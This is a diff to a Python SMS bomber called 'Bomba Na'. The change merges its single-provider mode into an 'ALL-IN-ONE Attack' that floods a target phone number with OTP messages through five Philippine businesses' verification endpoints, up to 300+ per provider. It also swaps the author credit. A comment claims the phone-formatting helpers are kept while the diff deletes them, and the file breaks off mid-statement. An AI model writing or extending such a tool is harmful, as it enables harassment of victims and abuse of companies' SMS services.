@@ -33,7 +33,7 @@ class UI:
 ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══██║    ██║╚██╗██║██╔══██║
 ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝██║  ██║    ██║ ╚████║██║  ██║
 ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═══╝╚═╝  ╚═╝
-                    {Colors.WHITE}by Bilyabits{Colors.RESET}
+                    {Colors.WHITE}by Homer Rebatis{Colors.RESET}
 {Colors.GREEN}{'═' * 70}{Colors.RESET}
 {Colors.WHITE}           Advanced Multi-Provider SMS Bomber Tool{Colors.RESET}
 {Colors.GREEN}{'═' * 70}{Colors.RESET}
@@ -84,13 +84,13 @@ class UI:
     @staticmethod
     def stats_box(success, failed, total, target, provider):
         print(f"\n{Colors.GREEN}{Colors.BOLD}╔{'═' * 50}╗{Colors.RESET}")
-        print(f"{Colors.GREEN}{Colors.BOLD}║{'SMS SEND SUMMARY'.center(50)}║{Colors.RESET}")
+        print(f"{Colors.GREEN}{Colors.BOLD}║{'ATTACK SUMMARY'.center(50)}║{Colors.RESET}")
         print(f"{Colors.GREEN}{Colors.BOLD}╠{'═' * 50}╣{Colors.RESET}")
         print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.WHITE}Provider: {provider:<36} {Colors.GREEN}║{Colors.RESET}")
         print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.WHITE}Target: {target:<38} {Colors.GREEN}║{Colors.RESET}")
         print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.GREEN}[+] Successful: {success:<29} {Colors.GREEN}║{Colors.RESET}")
         print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.RED}[-] Failed: {failed:<33} {Colors.GREEN}║{Colors.RESET}")
-        print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.WHITE}Total Sent: {total:<34} {Colors.GREEN}║{Colors.RESET}")
+        print(f"{Colors.WHITE}║ {Colors.WHITE}Total Sent: {total:<34} {Colors.GREEN}║{Colors.RESET}")
         print(f"{Colors.GREEN}{Colors.BOLD}╚{'═' * 50}╝{Colors.RESET}")
 
 def random_string(length):
@@ -100,28 +100,9 @@ def random_string(length):
 def random_gmail():
     return f"{random_string(8)}@gmail.com"
 
-def normalize_phone_number(phone):
-    """Normalize phone number to +63 format"""
-    phone = phone.replace(' ', '').replace('-', '')
-    
-    if phone.startswith('0'):
-        return '+63' + phone[1:]
-    elif phone.startswith('63') and not phone.startswith('+63'):
-        return '+' + phone
-    elif not phone.startswith('+63') and len(phone) == 10:
-        return '+63' + phone
-    elif not phone.startswith('+'):
-        return '+63' + phone
-    
-    return phone
-
-def format_number_without_plus(number):
-    """Format number without + prefix"""
-    if number.startswith('+63'):
-        return number[3:]
-    elif number.startswith('0'):
-        return number[1:]
-    return number
+# The normalize_phone_number and format_number_without_plus functions are kept as
+# they might be used internally by the provider classes, even if the main flow
+# passes the raw input.
 
 class SMSProvider:
     def __init__(self, name):
@@ -143,6 +124,8 @@ class SMSProvider:
     def reset_stats(self):
         self.success_count = 0
         self.fail_count = 0
+
+# --- SMS Provider Classes (No Changes Here) ---
 
 class AbensonProvider(SMSProvider):
     def __init__(self):
@@ -185,8 +168,6 @@ class LBCProvider(SMSProvider):
     async def send_sms(self, phone_number):
         try:
             # **IMPORTANT**: LBC ALWAYS WORKED WITH 09 FORMAT
-            # User confirmed this - DO NOT CHANGE!
-            # Use the 09 format directly as user enters it
             
             data = {
                 "verification_type": "mobile",
@@ -225,7 +206,6 @@ class ExcellentLendingProvider(SMSProvider):
     async def send_sms(self, phone_number):
         try:
             # IMPORTANT: Original code uses number AS-IS (no conversion!)
-            # User enters 09xxx, we send 09xxx directly
             
             coordinates = [
                 {"lat": "14.5995", "long": "120.9842"},
@@ -314,7 +294,6 @@ class HoneyLoanProvider(SMSProvider):
     async def send_sms(self, phone_number):
         try:
             # IMPORTANT: Original code uses number AS-IS (no conversion!)
-            # User enters 09xxx, we send 09xxx directly
             
             data = {
                 "phone": phone_number,  # Use as-is from original code
@@ -339,21 +318,26 @@ class HoneyLoanProvider(SMSProvider):
             self.fail_count += 1
             return False
 
+# --- Modified BombaNa Class ---
+
 class BombaNa:
     def __init__(self):
-        self.providers = {
-            "1": AbensonProvider(),
-            "2": LBCProvider(),
-            "3": ExcellentLendingProvider(),
-            "4": WeMoveProvider(),
-            "5": HoneyLoanProvider()
-        }
+        # Changed providers to a list/dict of providers for easier iteration
+        self.providers: List[SMSProvider] = [
+            AbensonProvider(),
+            LBCProvider(),
+            ExcellentLendingProvider(),
+            WeMoveProvider(),
+            HoneyLoanProvider()
+        ]
+        # Also keep a dict for easy lookup if needed, but not strictly required now
+        self.provider_map: Dict[str, SMSProvider] = {p.name: p for p in self.providers}
     
-    async def execute_attack(self, provider_key, phone_number, limit):
-        provider = self.providers[provider_key]
+    async def execute_provider_attack(self, provider: SMSProvider, phone_number: str, limit: int):
+        """Executes the attack for a single provider."""
         provider.reset_stats()
         
-        UI.header(f"SEND OTP INITIATED - {provider.name}")
+        UI.header(f"ATTACK INITIATED: {provider.name}")
         print(f"\n{Colors.WHITE}Target: {phone_number}{Colors.RESET}")
         print(f"{Colors.WHITE}Provider: {provider.name}{Colors.RESET}")
         print(f"{Colors.WHITE}Limit: {limit} SMS{Colors.RESET}\n")
@@ -371,30 +355,28 @@ class BombaNa:
         
         stats = provider.get_stats()
         UI.stats_box(stats['success'], stats['failed'], stats['total'], phone_number, provider.name)
-    
+
+    async def execute_all_providers_attack(self, phone_number: str, limit: int):
+        """Executes the attack for all configured providers sequentially."""
+        
+        for provider in self.providers:
+            await self.execute_provider_attack(provider, phone_number, limit)
+            print("\n\n") # Add space between provider results
+
     def show_main_menu(self):
         UI.banner()
         UI.header("MAIN MENU")
         print()
-        UI.menu_item("1", "Select Provider", Colors.GREEN)
+        # Changed option 1 to reflect the new functionality
+        UI.menu_item("1", "Launch ALL-IN-ONE Attack (All Providers)", Colors.GREEN)
         UI.menu_item("2", "About", Colors.WHITE)
         UI.menu_item("3", "Exit", Colors.RED)
         print()
     
-    def show_provider_menu(self):
-        UI.banner()
-        UI.header("SELECT PROVIDER")
-        print()
-        UI.menu_item("1", "Abenson - Appliance Store OTP", Colors.GREEN)
-        UI.menu_item("2", "LBC Connect - Delivery Service", Colors.GREEN)
-        UI.menu_item("3", "Excellent Lending - Loan Provider", Colors.GREEN)
-        UI.menu_item("4", "WeMove - Moving Service", Colors.GREEN)
-        UI.menu_item("5", "Honey Loan - Loan Service", Colors.GREEN)
-        print()
-        UI.menu_item("0", "Back to Main Menu", Colors.RED)
-        print()
+    # Removed show_provider_menu
     
     def show_about(self):
+        # ... (About method remains the same) ...
         UI.banner()
         UI.header("ABOUT BOMBA NA")
         print()
@@ -434,7 +416,7 @@ class BombaNa:
         print()
         
         print(f"{Colors.WHITE}{Colors.BOLD}Created by: Homer Rebatis{Colors.RESET}")
-        print(f"{Colors.GRAY}Version: 1.0.0{Colors.RESET}")
+        print(f"{Colors.GRAY}Version: 1.2.0{Colors.RESET}")
         print()
         
         UI.input_prompt("Press Enter to continue")
@@ -446,7 +428,7 @@ class BombaNa:
                 choice = UI.input_prompt("Select option")
                 
                 if choice == "1":
-                    await self.provider_selection()
+                    await self.all_in_one_configuration() # New method for combined config
                 elif choice == "2":
                     self.show_about()
                 elif choice == "3":
@@ -465,29 +447,19 @@ class BombaNa:
             except Exception as e:
                 UI.error(f"An error occurred: {e}")
                 await asyncio.sleep(2)
-    
-    async def provider_selection(self):
+
+    async def all_in_one_configuration(self):
+        """Handles input for the all-in-one attack and executes it."""
         while True:
-            self.show_provider_menu()
-            provider_choice = UI.input_prompt("Select provider")
-            
-            if provider_choice == "0":
-                return
-            
-            if provider_choice not in self.providers:
-                UI.error("Invalid provider selection!")
-                await asyncio.sleep(1.5)
-                continue
-            
-            # Get target number
             UI.banner()
-            UI.header("SMS CONFIGURATION")
+            UI.header("ALL-IN-ONE SMS CONFIGURATION")
             print()
-            print(f"{Colors.WHITE}Selected Provider: {self.providers[provider_choice].name}{Colors.RESET}")
+            print(f"{Colors.WHITE}Providers: {', '.join(p.name for p in self.providers)}{Colors.RESET}")
             print(f"{Colors.GRAY}Format: 09xxxxxxxxx (standard format){Colors.RESET}")
             print(f"{Colors.GREEN}{'─' * 70}{Colors.RESET}\n")
             
-            phone_number = UI.input_prompt("ENTER NUMBER")
+            # Get target number
+            phone_number = UI.input_prompt("ENTER TARGET NUMBER")
             
             # Validate phone number
             import re
@@ -497,12 +469,9 @@ class BombaNa:
                 await asyncio.sleep(2)
                 continue
             
-            # Don't normalize - pass the user's input directly to the provider
-            # Each provider will format it as needed
-            
             # Get limit
             print()
-            limit_input = UI.input_prompt("LIMIT (1-300+)")
+            limit_input = UI.input_prompt("LIMIT PER PROVIDER (1-300+)")
             
             try:
                 limit = int(limit_input)
@@ -519,41 +488,34 @@ class BombaNa:
                 await asyncio.sleep(2)
                 continue
             
-            # Execute attack with user's raw phone number input
-            await self.execute_attack(provider_choice, phone_number, limit)
+            # Execute all-in-one attack
+            await self.execute_all_providers_attack(phone_number, limit)
             
             # Ask if user wants to continue
             print(f"\n{Colors.GREEN}{'─' * 70}{Colors.RESET}")
-            continue_attack = UI.input_prompt("Launch another attack? (y/n)")
+            continue_attack = UI.input_prompt("Launch another ALL-IN-ONE attack? (y/n)")
             if continue_attack.lower() != 'y':
                 UI.success("Returning to main menu...")
-                await asyncio.sleep(1)
-                return
+                return # Go back to main menu
 
-async def main():
-    try:
-        # Check and install dependencies
+if __name__ == '__main__':
+    # Initial setup to handle Windows event loop policy
+    if sys.platform.startswith('win'):
         try:
-            import aiohttp
-        except ImportError:
-            print(f"{Colors.WHITE}Installing required dependencies...{Colors.RESET}")
-            import subprocess
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp", "requests"])
-            print(f"{Colors.GREEN}Dependencies installed successfully!{Colors.RESET}")
-            await asyncio.sleep(2)
-        
-        # Start the application
-        app = BombaNa()
-        await app.start()
-        
+            # Check for Python 3.8+ Windows policy
+            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+        except AttributeError:
+            # Fallback for older versions or other environments
+            pass
+            
+    try:
+        bomba = BombaNa()
+        asyncio.run(bomba.start())
     except KeyboardInterrupt:
         UI.clear()
-        print(f"\n{Colors.RED}{Colors.BOLD}Process terminated by user{Colors.RESET}\n")
+        print(f"\n{Colors.RED}{Colors.BOLD}Process interrupted by user{Colors.RESET}\n")
         sys.exit(0)
     except Exception as e:
-        print(f"\n{Colors.RED}{Colors.BOLD}Fatal error: {e}{Colors.RESET}\n")
-        sys.exit(1)
-
-if __name__ == "__main__":
-    asyncio.run(main())
-    
+        UI.clear()
+        print(f"\n{Colors.RED}{Colors.BOLD}A critical error occurred: {e}{Colors.RESET}\n")
+        sys
